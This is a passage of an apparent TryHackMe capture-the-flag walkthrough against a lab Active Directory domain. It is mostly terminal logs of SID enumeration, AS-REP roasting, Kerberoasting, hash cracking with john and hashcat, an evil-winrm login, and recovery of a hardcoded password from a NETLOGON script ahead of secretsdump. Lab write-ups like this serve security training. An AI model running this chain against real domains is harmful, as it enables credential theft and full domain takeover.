SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)                                                                                                            
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                 
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                  
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)

or

┌──(kali㉿kali)-[~/VulnNet]
└─$ impacket-lookupsid vulnnet-rst.local/guest@10.10.129.88 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.129.88
[*] StringBinding ncacn_np:10.10.129.88[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

or

┌──(kali㉿kali)-[~/VulnNet]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.129.88 | tee users.txt
Password:
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.129.88
[*] StringBinding ncacn_np:10.10.129.88[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

formtatting

┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $1}'
500:
501:
502:
1000:
1104:
1105:
1109:
1110:
1111:
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $3}'
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
(SidTypeUser)
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $2}'
VULNNET-RST\Administrator
VULNNET-RST\Guest
VULNNET-RST\krbtgt
VULNNET-RST\WIN-2BO8M1OE1M1$
VULNNET-RST\enterprise-core-vn
VULNNET-RST\a-whitehat
VULNNET-RST\t-skid
VULNNET-RST\j-goldenhand
VULNNET-RST\j-leet


┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f1
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
VULNNET-RST
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f2
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet

┌──(kali㉿kali)-[~/VulnNet]
└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f2 > format_users.txt
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat format_users.txt                                                                    
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet


Alexa Whitehat (i.e. a-whitehat)  
Jack Goldenhand (i.e. j-goldenhand)  
Tony Skid (i.e. t-skid)  
Johnny Leet (i.e. j-leet)

ASREPRoasting

ASReproasting occurs when a user account has the privilege “_Does not require Pre-Authentication_” set. This means that the account does not not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

We can retrieve Kerberos tickets using a tool called “**GetNPUsers.py**” in [Impacket](https://github.com/SecureAuthCorp/impacket). This allows us to query ASREProastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames, which we enumerated previously during our SMB enumeration.


Now, let’s use GetNPUsers.py to find users without Kerberos pre-authentication

┌──(kali㉿kali)-[~/VulnNet]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.129.88 -usersfile format_users.txt -no-pass -request -outputfile kerberos-users-found
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ ls
Business-Manager.txt   Business-Tracking.txt      Enterprise-Safety.txt  format_users.txt      users.txt
Business-Sections.txt  Enterprise-Operations.txt  Enterprise-Sync.txt    kerberos-users-found
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat kerberos-users-found 
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c6385d75e60333f829eec$86df35297f9cf61ae87137e3113f99a246a12fe1ca2af5e411c139d7c0be0045d22705095418d4a82f381db5b1a6348b79522381e40e320acc53a62e4479a88de5042f3f1eea6aaf8cabeee0d5113c592ff95a15be90b7b21571ce932b80f7d9c2abbd3b37960cc8185ec4e63219f15f1ccb4e9b59b22d6683c1431fd059f4bdc08e89cc69e51dd216c5d73d9112eae49f97b4c3bb4cb240030d1bb9d090fa56421d872b2ab72ee434ec0ac3e5e34b919fb71a42858b02e6bc514feddb58299ad660065c8496e089327bb5a85e81d1f77e2742912fb9f23e91ddd7e06064a58c15aee8dc82bcaad19b67b89e88a49b5665f766952f87


┌──(kali㉿kali)-[~/VulnNet]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found       
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:04 DONE (2022-12-30 14:50) 0.2136g/s 679165p/s 679165c/s 679165C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


or using hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes


El _KDC_ (Key Distribution Center), el servicio de _Kerberos_ encargado de distribuir los tickets a los clientes

we can use hashcat to crack the “_Kerberos 5 AS-REP type 23_” hash retrieved from the KDC

┌──(kali㉿kali)-[~/VulnNet]
└─$ hashcat -m 18200 -a 0 kerberos-users-found /usr/share/wordlists/rockyou.txt -o cracked_skid.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c...952f87
Time.Started.....: Fri Dec 30 14:59:25 2022 (6 secs)
Time.Estimated...: Fri Dec 30 14:59:31 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   567.9 kH/s (0.98ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3178496/14344385 (22.16%)
Rejected.........: 0/3178496 (0.00%)
Restore.Point....: 3177472/14344385 (22.15%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: tjamaalb -> tj030499
Hardware.Mon.#1..: Util: 44%

Started: Fri Dec 30 14:58:29 2022
Stopped: Fri Dec 30 14:59:33 2022

┌──(kali㉿kali)-[~/VulnNet]
└─$ cat cracked_skid.txt    
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c6385d75e60333f829eec$86df35297f9cf61ae87137e3113f99a246a12fe1ca2af5e411c139d7c0be0045d22705095418d4a82f381db5b1a6348b79522381e40e320acc53a62e4479a88de5042f3f1eea6aaf8cabeee0d5113c592ff95a15be90b7b21571ce932b80f7d9c2abbd3b37960cc8185ec4e63219f15f1ccb4e9b59b22d6683c1431fd059f4bdc08e89cc69e51dd216c5d73d9112eae49f97b4c3bb4cb240030d1bb9d090fa56421d872b2ab72ee434ec0ac3e5e34b919fb71a42858b02e6bc514feddb58299ad660065c8496e089327bb5a85e81d1f77e2742912fb9f23e91ddd7e06064a58c15aee8dc82bcaad19b67b89e88a49b5665f766952f87:tj072889*


Kerberoasting

Now that I have a set of standard user credentials, I started looking for supported **Service Principal Name’s (SPN’s)** and get **Ticket Granting Service (TGS)** for the SPN using “**GetUserSPNs**” tool from Impacket.

┌──(kali㉿kali)-[~/VulnNet]
└─$ GetUserSPNs.py vulnnet-rst.local/t-skid:tj072889* -dc-ip 10.10.129.88 -request
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$cccf0ecfd900c84f2ff97ada6b44cb74$c0fe5cf6d16b1e2b16cc4dab74ab8591ce15b2e3263099b65da8d9eaf0adb4373ea5c1f8578f0709d3e046196a9e4cae6be6516fdaddc842744799790214dbd512dc3bbc7775e5812f7022a3d6ef2380d5561fa02e7c2a42ffc8ca65c140a768b93bf78c873b8ad77b78f26f678907ad73c2890f9cdd4f55e42cc483295782ebfba84e22471c9121d609f58fc3689456c354502487f338e77d3109ab69cdff87c73bd6d90391a1e252df3bf45132133c8cb7440c5e724e5b176489dbb117cc9b88e072dc28947a8d3271555ce141ad15142a5f1ad6f81c85ad67c3c8fe8946dbdba6f15318e511bf8f21261240531e3a8fe5f9bd2e97f1dd7e46d568946fec94be3fca048c7b1e71b9b5ac81586aa3db54b36b693fd5dfc5ae509c26f977beb20fe579971116606ceba00745efa89c6448aed353dbebf338a9680e858de99e329cbd50c760d542dc01f7c1e607e9a9a0a666192d52f8f148a4156e38aa61620b463188106a600120ad843db0826c5cba40b7d5517bc78397ac2a56a7e6e6b8d70684a3785e7c323dc990e90db71583e06e12a746e4dea9002a7ea9ba88ef947396ac0660627e91706108fa2cf89978d748d33e508f948dafa562b9490635aae624f755a97e42f7c8f07e3448e4ee27f9efba7e86916cd7864257683cfd01c57bf54c3d282fa7c5695547109bedb1194562fd065b8789e33a5babcac53dd737d7b050bb8cfe82d91d01571b577420a04093ca7af67653340d7be6d037bc72c72ee1495e5de5e578169ba3d93344d66adc5f73f55e5ce0779d9c259a5076f71068c877e769bfa11aa540704bd7b24d8492573941f7b5ec8122b1d1da84c904bd8af46d9185f2bf14095971e85e62bb6dd5d551b1faed46d4661dd7b6278e3a6b67aed0829ec1c1efa83bd0fe47bb19a9bef3978b3e40d47d970666d739c7fd86ffb58a697906a1d2382e7bdfa578580ed4393b04e1c16bec3f5ecf8a411221ba0150c176a54b9fc9608c6749c5725255d6610a521485754fbd8ee590c3491f3b6625aa244065cfa9a4b03c70318e8da8d5f547b50b7bbf347be976568142a4ddaea71cfa2043d1bfcf691483822addf1bf334fba119d33129093daec0450dca995daa491ade9622171d5bddac26bea0639dc1967fb043a62b0545cf10ed1d48f1cd9042fb0806a0a7501696bb4ff132fafc7b4c923f726157cf02c26600651a86319c52ad7efd9746245cadb808285f897bf16e2153c0afd03d53d6de00ece58687a192db2c5f6fdbbc9400a89a0cd801f174c87b212ed0f603826795c3a027e807703806b6c3a3674076b552aefeff27c9933d70791e674982ed5cf87037f2981e8667482a3a9ad96bedad177f1095535c6df0bbf8879de54cff5e8f4dc

┌──(kali㉿kali)-[~/VulnNet]
└─$ nano enterprise-hash           
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt enterprise-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:03 DONE (2022-12-30 15:07) 0.2824g/s 1160Kp/s 1160Kc/s 1160KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

or using hashcat

┌──(kali㉿kali)-[~/VulnNet]
└─$ hashcat -m 13100 -a 0 enterprise-hash /usr/share/wordlists/rockyou.txt -o cracked_enterprise.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$v...e8f4dc
Time.Started.....: Fri Dec 30 15:09:10 2022 (11 secs)
Time.Estimated...: Fri Dec 30 15:09:21 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   450.1 kH/s (1.10ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4109312/14344385 (28.65%)
Rejected.........: 0/4109312 (0.00%)
Restore.Point....: 4108288/14344385 (28.64%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ry=iu0if] -> rwtf32
Hardware.Mon.#1..: Util: 41%

Started: Fri Dec 30 15:08:33 2022
Stopped: Fri Dec 30 15:09:22 2022


┌──(kali㉿kali)-[~/VulnNet]
└─$ cat cracked_enterprise.txt 
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$cccf0ecfd900c84f2ff97ada6b44cb74$c0fe5cf6d16b1e2b16cc4dab74ab8591ce15b2e3263099b65da8d9eaf0adb4373ea5c1f8578f0709d3e046196a9e4cae6be6516fdaddc842744799790214dbd512dc3bbc7775e5812f7022a3d6ef2380d5561fa02e7c2a42ffc8ca65c140a768b93bf78c873b8ad77b78f26f678907ad73c2890f9cdd4f55e42cc483295782ebfba84e22471c9121d609f58fc3689456c354502487f338e77d3109ab69cdff87c73bd6d90391a1e252df3bf45132133c8cb7440c5e724e5b176489dbb117cc9b88e072dc28947a8d3271555ce141ad15142a5f1ad6f81c85ad67c3c8fe8946dbdba6f15318e511bf8f21261240531e3a8fe5f9bd2e97f1dd7e46d568946fec94be3fca048c7b1e71b9b5ac81586aa3db54b36b693fd5dfc5ae509c26f977beb20fe579971116606ceba00745efa89c6448aed353dbebf338a9680e858de99e329cbd50c760d542dc01f7c1e607e9a9a0a666192d52f8f148a4156e38aa61620b463188106a600120ad843db0826c5cba40b7d5517bc78397ac2a56a7e6e6b8d70684a3785e7c323dc990e90db71583e06e12a746e4dea9002a7ea9ba88ef947396ac0660627e91706108fa2cf89978d748d33e508f948dafa562b9490635aae624f755a97e42f7c8f07e3448e4ee27f9efba7e86916cd7864257683cfd01c57bf54c3d282fa7c5695547109bedb1194562fd065b8789e33a5babcac53dd737d7b050bb8cfe82d91d01571b577420a04093ca7af67653340d7be6d037bc72c72ee1495e5de5e578169ba3d93344d66adc5f73f55e5ce0779d9c259a5076f71068c877e769bfa11aa540704bd7b24d8492573941f7b5ec8122b1d1da84c904bd8af46d9185f2bf14095971e85e62bb6dd5d551b1faed46d4661dd7b6278e3a6b67aed0829ec1c1efa83bd0fe47bb19a9bef3978b3e40d47d970666d739c7fd86ffb58a697906a1d2382e7bdfa578580ed4393b04e1c16bec3f5ecf8a411221ba0150c176a54b9fc9608c6749c5725255d6610a521485754fbd8ee590c3491f3b6625aa244065cfa9a4b03c70318e8da8d5f547b50b7bbf347be976568142a4ddaea71cfa2043d1bfcf691483822addf1bf334fba119d33129093daec0450dca995daa491ade9622171d5bddac26bea0639dc1967fb043a62b0545cf10ed1d48f1cd9042fb0806a0a7501696bb4ff132fafc7b4c923f726157cf02c26600651a86319c52ad7efd9746245cadb808285f897bf16e2153c0afd03d53d6de00ece58687a192db2c5f6fdbbc9400a89a0cd801f174c87b212ed0f603826795c3a027e807703806b6c3a3674076b552aefeff27c9933d70791e674982ed5cf87037f2981e8667482a3a9ad96bedad177f1095535c6df0bbf8879de54cff5e8f4dc:ry=ibfkfv,s6h,

now using evil-winrm

┌──(root㉿kali)-[/home/kali/VulnNet]
└─# evil-winrm -i 10.10.169.84 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -N


Evil-WinRM shell v3.4

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

^C

Warning: Press "y" to exit, press any other key to continue


Info: Exiting...


┌──(kali㉿kali)-[~/VulnNet]
└─$ sudo impacket-wmiexec  vulnnet-rst.local/enterprise-core-vn:ry=ibfkfv,s6h,@10.10.169.84
[sudo] password for kali: 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

┌──(kali㉿kali)-[~/VulnNet]
└─$ evil-winrm -i 10.10.169.84 -u "enterprise-core-vn" -p "ry=ibfkfv,s6h," -N             

Evil-WinRM shell v3.4

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> dir
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}

:)

privesc

┌──(kali㉿kali)-[~/VulnNet]
└─$ smbclient \\\\10.10.169.84\\NETLOGON -U t-skid
Password for [WORKGROUP\t-skid]: tj072889*
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8540159 blocks of size 4096. 4319566 blocks available
smb: \> mget *
Get file ResetPassword.vbs? yes
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> quit

or

──(kali㉿kali)-[~/VulnNet]
└─$ smbclient \\\\10.10.169.84\\SYSVOL -U t-skid
Password for [WORKGROUP\t-skid]: tj072889*
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8540159 blocks of size 4096. 4319297 blocks available
smb: \> cd vulnnet-rst.local\
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8540159 blocks of size 4096. 4319038 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8540159 blocks of size 4096. 4319038 blocks available


┌──(kali㉿kali)-[~/VulnNet]
└─$ more ResetPassword.vbs                
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

a-whitehat : bNdKVkjv3RR9ht

use secretsdump.py to dump the NTLM hashes for all the users on the DC machine

┌──(kali㉿kali)-[~/VulnNet]
└─$ sudo secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.169.84 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
